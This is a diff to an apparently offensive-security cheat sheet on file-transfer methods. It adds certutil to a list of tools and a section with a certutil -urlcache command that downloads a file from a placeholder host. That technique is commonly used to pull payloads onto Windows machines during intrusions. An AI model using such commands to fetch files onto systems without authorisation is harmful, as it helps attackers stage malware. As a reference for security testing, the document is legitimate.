@@ -1,6 +1,7 @@
 # Methods
 
 Copy & paste with base64 encoding.
+`certutil` Download files.
 `curl` Retrieve remote files.
 `impacket-smbserver` Temporary SMB server.
 `invoke-webrequest` PowerShell HTTP request.
@@ -9,6 +10,10 @@ Copy & paste with base64 encoding.
 `python` Temporary web server.
 `scp` Remote file copy via SSH.
 `wget` Retrieve remote files.
+
+# certutil
+
+`certutil -urlcache http://ipaddress/filename outputfilename`
 
 # FTP
 
